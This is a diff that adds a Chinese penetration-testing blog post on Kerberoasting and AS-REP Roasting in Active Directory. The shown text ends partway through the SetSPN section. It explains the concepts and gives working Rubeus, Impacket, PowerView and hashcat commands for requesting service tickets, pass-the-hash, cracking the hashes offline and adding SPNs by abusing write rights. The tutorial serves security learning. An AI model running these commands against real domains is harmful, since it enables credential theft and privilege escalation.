@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言在Active Directory域环境中，Kerberos协议是默认的身份认证机制。攻击者在获得域内任意一个普通用户权限后，可以利用Kerberos协议的设计特性，离线破解服务账户的明文密码——这类攻击统称为”Kerberoasting”。其威力在于不需要提权、不需要横向移动，只凭一个普通域用户身份即可发起。与其原理相似但攻击路径不同的还有AS-REP Roasting，它甚至不需要任何认证">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kerberoasting与AS-REP Roasting">
+<meta property="og:url" content="https://congliang.github.io/Intranet-Kerberoasting/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言在Active Directory域环境中，Kerberos协议是默认的身份认证机制。攻击者在获得域内任意一个普通用户权限后，可以利用Kerberos协议的设计特性，离线破解服务账户的明文密码——这类攻击统称为”Kerberoasting”。其威力在于不需要提权、不需要横向移动，只凭一个普通域用户身份即可发起。与其原理相似但攻击路径不同的还有AS-REP Roasting，它甚至不需要任何认证">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-05-05T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.904Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="密码学">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Intranet-Kerberoasting/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Intranet-Kerberoasting/","path":"Intranet-Kerberoasting/","title":"Kerberoasting与AS-REP Roasting"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Kerberoasting与AS-REP Roasting | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81SPN%EF%BC%88Service-Principal-Name%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">一、SPN（Service Principal Name）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Kerberoasting%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">二、Kerberoasting攻击原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Rubeus-GetUserSPNs"><span class="nav-number">4.</span> <span class="nav-text">三、Rubeus GetUserSPNs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Impacket-GetUserSPNs"><span class="nav-number">5.</span> <span class="nav-text">四、Impacket-GetUserSPNs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81Hashcat%E7%A0%B4%E8%A7%A3TGS%E7%A5%A8%E6%8D%AE"><span class="nav-number">6.</span> <span class="nav-text">五、Hashcat破解TGS票据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-Mode-13100%EF%BC%88RC4%E5%8A%A0%E5%AF%86%EF%BC%89"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 Mode 13100（RC4加密）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-Mode-19700%EF%BC%88AES%E5%8A%A0%E5%AF%86%EF%BC%89"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 Mode 19700（AES加密）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E5%AE%9A%E5%88%B6%E5%8C%96%E7%A0%B4%E8%A7%A3%E7%AD%96%E7%95%A5"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 定制化破解策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81AS-REP-Roasting%EF%BC%9A%E6%97%A0%E9%9C%80%E8%AE%A4%E8%AF%81%E7%9A%84%E6%94%BB%E5%87%BB"><span class="nav-number">7.</span> <span class="nav-text">六、AS-REP Roasting：无需认证的攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E6%9E%9A%E4%B8%BE%E4%B8%8E%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 枚举与攻击执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-Hashcat-Mode-18200"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 Hashcat Mode 18200</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81SetSPN%E5%9C%A8%E6%94%BB%E5%87%BB%E9%93%BE%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">8.</span> <span class="nav-text">七、SetSPN在攻击链中的利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E4%B8%A4%E7%A7%8D%E6%94%BB%E5%87%BB%E5%AF%B9%E6%AF%94%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%95%88%E7%8E%87"><span class="nav-number">9.</span> <span class="nav-text">八、两种攻击对比与破解效率</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">10.</span> <span class="nav-text">九、防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9-1-%E8%B4%A6%E6%88%B7%E4%B8%8E%E5%AF%86%E7%A0%81%E7%AE%A1%E7%90%86"><span class="nav-number">10.1.</span> <span class="nav-text">9.1 账户与密码管理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-2-%E5%8A%A0%E5%AF%86%E7%AD%96%E7%95%A5"><span class="nav-number">10.2.</span> <span class="nav-text">9.2 加密策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-3-%E7%9B%91%E6%8E%A7%E4%B8%8E%E6%A3%80%E6%B5%8B"><span class="nav-number">10.3.</span> <span class="nav-text">9.3 监控与检测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-4-%E5%AE%A1%E8%AE%A1%E8%84%9A%E6%9C%AC"><span class="nav-number">10.4.</span> <span class="nav-text">9.4 审计脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF"><span class="nav-number">11.</span> <span class="nav-text">十、实战场景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9A%E7%BB%8F%E5%85%B8Kerberoasting%E6%8F%90%E6%9D%83"><span class="nav-number">11.1.</span> <span class="nav-text">场景一：经典Kerberoasting提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9AAS-REP-Roasting%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">11.2.</span> <span class="nav-text">场景二：AS-REP Roasting外网打点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%89%EF%BC%9ASetSPN%E6%9D%83%E9%99%90%E6%BB%A5%E7%94%A8%E6%8F%90%E6%9D%83"><span class="nav-number">11.3.</span> <span class="nav-text">场景三：SetSPN权限滥用提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">12.</span> <span class="nav-text">十一、免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%BA%90"><span class="nav-number">13.</span> <span class="nav-text">参考资源</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Intranet-Kerberoasting/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Kerberoasting与AS-REP Roasting | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Kerberoasting与AS-REP Roasting
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-05-05 08:00:00" itemprop="dateCreated datePublished" datetime="2025-05-05T08:00:00+08:00">2025-05-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Active Directory域环境中，Kerberos协议是默认的身份认证机制。攻击者在获得域内任意一个普通用户权限后，可以利用Kerberos协议的设计特性，离线破解服务账户的明文密码——这类攻击统称为”Kerberoasting”。其威力在于不需要提权、不需要横向移动，只凭一个普通域用户身份即可发起。与其原理相似但攻击路径不同的还有AS-REP Roasting，它甚至不需要任何认证即可完成攻击。本文将从SPN概念出发，系统性地梳理这两种攻击的原理、工具链与防御策略。</p>
+<h2 id="一、SPN（Service-Principal-Name）"><a href="#一、SPN（Service-Principal-Name）" class="headerlink" title="一、SPN（Service Principal Name）"></a>一、SPN（Service Principal Name）</h2><p>SPN是Kerberos体系中用于唯一标识服务实例的名称，标准格式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure>
+
+<p>常见示例：<code>HTTP/webserver.domain.local</code>、<code>MSSQLSvc/sql01.domain.local:1433</code>、<code>CIFS/dc01.domain.local</code>。</p>
+<p>SPN记录存储在Active Directory的<code>servicePrincipalName</code>属性中，通常与域用户（服务账户）或计算机账户关联。对攻击者而言，SPN是一份”服务清单”——通过枚举域内所有SPN可快速发现Web服务、数据库、域控等关键资产。更关键的是，任何拥有SPN的账户，其TGS票据（Ticket Granting Service）都可以被域内任意用户申请并导出，这正是Kerberoasting攻击的基础。</p>
+<h2 id="二、Kerberoasting攻击原理"><a href="#二、Kerberoasting攻击原理" class="headerlink" title="二、Kerberoasting攻击原理"></a>二、Kerberoasting攻击原理</h2><p>Kerberos认证涉及三个阶段：</p>
+<ol>
+<li><strong>AS-REQ &#x2F; AS-REP</strong>：用户向KDC证明身份，获得TGT（Ticket Granting Ticket）。</li>
+<li><strong>TGS-REQ &#x2F; TGS-REP</strong>：用户使用TGT向KDC申请访问特定服务的服务票据（Service Ticket&#x2F;ST）。</li>
+<li><strong>AP-REQ &#x2F; AP-REP</strong>：用户使用ST向目标服务发起认证。</li>
+</ol>
+<p>Kerberoasting的关键在第二阶段。KDC使用<strong>服务账户的NTLM哈希</strong>加密ST的某一部分后返回给用户。攻击者可将ST导出到离线环境，通过字典或暴力破解恢复服务账户的明文密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普通域用户 --&gt; 枚举SPN --&gt; 请求TGS票据 --&gt; 导出加密ST</span><br><span class="line">    --&gt; 离线破解（hashcat / john） --&gt; 获得明文密码</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击条件</strong>：拥有有效域用户凭据（无需高权限）、目标注册了SPN、服务账户密码强度低。</p>
+<h2 id="三、Rubeus-GetUserSPNs"><a href="#三、Rubeus-GetUserSPNs" class="headerlink" title="三、Rubeus GetUserSPNs"></a>三、Rubeus GetUserSPNs</h2><p>Rubeus是GhostPack团队开发的C#工具，集成了多种Kerberos攻击功能，是Kerberoasting的首选工具。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举域内所有SPN并请求TGS票据</span></span><br><span class="line">Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定域控制器与输出文件</span></span><br><span class="line">Rubeus.exe kerberoast /domain:corp.local /dc:dc01.corp.local /outfile:hashes.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 筛选高价值目标（指定SPN或LDAP过滤器）</span></span><br><span class="line">Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local</span><br><span class="line">Rubeus.exe kerberoast /ldapfilter:<span class="string">&quot;admincount=1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Rubeus输出的Hash格式为Hashcat mode 13100（RC4-HMAC），形如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*user$domain$MSSQLSvc/sql01.corp.local*$hex$hex...</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>$23$</code>表示RC4加密类型，这是最易破解的类型。AES加密（<code>$18$</code>）的破解难度极大，实际攻击中攻击者更关注RC4票据。</p>
+<h2 id="四、Impacket-GetUserSPNs"><a href="#四、Impacket-GetUserSPNs" class="headerlink" title="四、Impacket-GetUserSPNs"></a>四、Impacket-GetUserSPNs</h2><p>Impacket工具集中的GetUserSPNs.py是Python实现的Kerberoasting工具，适用于非Windows攻击环境。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举所有SPN并请求TGS票据（明文密码认证）</span></span><br><span class="line">impacket-GetUserSPNs -request -dc-ip 192.168.1.10 corp.local/user:password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用NTLM哈希认证（Pass-the-Hash）</span></span><br><span class="line">impacket-GetUserSPNs -request -dc-ip 192.168.1.10 \</span><br><span class="line">    -hashes :&lt;ntlm_hash&gt; corp.local/user</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定目标用户并保存到文件</span></span><br><span class="line">impacket-GetUserSPNs -request -dc-ip 192.168.1.10 \</span><br><span class="line">    corp.local/user:password -request-user sql_svc -outputfile hashes.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、Hashcat破解TGS票据"><a href="#五、Hashcat破解TGS票据" class="headerlink" title="五、Hashcat破解TGS票据"></a>五、Hashcat破解TGS票据</h2><h3 id="5-1-Mode-13100（RC4加密）"><a href="#5-1-Mode-13100（RC4加密）" class="headerlink" title="5.1 Mode 13100（RC4加密）"></a>5.1 Mode 13100（RC4加密）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础字典攻击</span></span><br><span class="line">hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 规则+字典（组合爆破）</span></span><br><span class="line">hashcat -m 13100 -a 0 hashes.txt dict.txt -r best64.rule</span><br><span class="line"></span><br><span class="line"><span class="comment"># 掩码攻击（8位所有可打印字符）</span></span><br><span class="line">hashcat -m 13100 -a 3 hashes.txt ?a?a?a?a?a?a?a?a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 混合攻击（字典+掩码后缀）</span></span><br><span class="line">hashcat -m 13100 -a 6 hashes.txt dict.txt ?d?d?d?d</span><br><span class="line"></span><br><span class="line"><span class="comment"># GPU优化模式</span></span><br><span class="line">hashcat -m 13100 -a 0 -O -w 3 hashes.txt dict.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-Mode-19700（AES加密）"><a href="#5-2-Mode-19700（AES加密）" class="headerlink" title="5.2 Mode 19700（AES加密）"></a>5.2 Mode 19700（AES加密）</h3><p>当TGS票据使用AES-256加密时，对应mode 19700。破解速度极慢，除非目标密码极弱（如纯数字短密码），否则不具备实际破解性。<strong>这也是防御Kerberoasting的关键策略之一——强制域内使用AES加密。</strong></p>
+<h3 id="5-3-定制化破解策略"><a href="#5-3-定制化破解策略" class="headerlink" title="5.3 定制化破解策略"></a>5.3 定制化破解策略</h3><p>基于目标组织的密码策略和命名规范生成定制字典，是提高破解成功率的核心。例如已知某公司采用<code>SeasonYear!</code>模式，可使用hashcat的规则组合<code>(Summer|Winter|Spring)(20\d{2})!</code>快速爆破。</p>
+<h2 id="六、AS-REP-Roasting：无需认证的攻击"><a href="#六、AS-REP-Roasting：无需认证的攻击" class="headerlink" title="六、AS-REP Roasting：无需认证的攻击"></a>六、AS-REP Roasting：无需认证的攻击</h2><h3 id="6-1-攻击原理"><a href="#6-1-攻击原理" class="headerlink" title="6.1 攻击原理"></a>6.1 攻击原理</h3><p>AS-REP Roasting攻击Kerberos认证的<strong>第一阶段</strong>。当域用户启用了”不要求Kerberos预身份认证”（UF_DONT_REQUIRE_PREAUTH，userAccountControl标志位4194304）时，攻击者可在<strong>不知道密码的情况下</strong>，以该用户身份向KDC发送AS-REQ请求。KDC会返回使用用户NTLM哈希加密的AS-REP响应，攻击者将其离线破解：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者 --&gt; 伪造AS-REQ（声称是目标用户） --&gt; KDC返回AS-REP</span><br><span class="line">    --&gt; 导出加密部分 --&gt; 离线破解（hashcat mode 18200）</span><br><span class="line">    --&gt; 获得目标用户明文密码</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-枚举与攻击执行"><a href="#6-2-枚举与攻击执行" class="headerlink" title="6.2 枚举与攻击执行"></a>6.2 枚举与攻击执行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举关闭预认证的用户（PowerView）</span></span><br><span class="line"><span class="built_in">Get-DomainUser</span> <span class="literal">-PreauthNotRequired</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Rubeus一键执行AS-REP Roasting</span></span><br><span class="line">Rubeus.exe asreproast /outfile:asrep_hashes.txt</span><br><span class="line">Rubeus.exe asreproast /user:targetuser /outfile:target.hash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Impacket方式——无需任何域凭据</span></span><br><span class="line">impacket-GetNPUsers -dc-ip 192.168.1.10 corp.local/ -usersfile users.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定单个用户</span></span><br><span class="line">impacket-GetNPUsers -dc-ip 192.168.1.10 corp.local/targetuser -no-pass</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量输出为hashcat格式</span></span><br><span class="line">impacket-GetNPUsers -dc-ip 192.168.1.10 corp.local/ \</span><br><span class="line">    -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-Hashcat-Mode-18200"><a href="#6-3-Hashcat-Mode-18200" class="headerlink" title="6.3 Hashcat Mode 18200"></a>6.3 Hashcat Mode 18200</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># AS-REP Hash格式：$krb5asrep$23$user@domain:hash...</span></span><br><span class="line">hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat -m 18200 -a 0 -O -w 3 asrep_hashes.txt dict.txt -r best64.rule</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、SetSPN在攻击链中的利用"><a href="#七、SetSPN在攻击链中的利用" class="headerlink" title="七、SetSPN在攻击链中的利用"></a>七、SetSPN在攻击链中的利用</h2><p>SetSPN.exe是Windows原生SPN管理工具。在Kerberoasting攻击中，SetSPN与ACL滥用结合可实现攻击面的扩展。</p>
+<p>当攻击者拥有的账户对另一个域用户具有GenericWrite或WriteProperty权限时，可以为其添加SPN，随后对该账户执行Kerberoasting：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为目标用户添加SPN（需要写权限）</span></span><br><span class="line">setspn <span class="literal">-s</span> HTTP/temp.corp.local target_user</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或通过PowerShell AD模块</span></span><br><span class="line"><span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> target_user <span class="literal">-Add</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    <span class="string">&quot;servicePrincipalName&quot;</span> 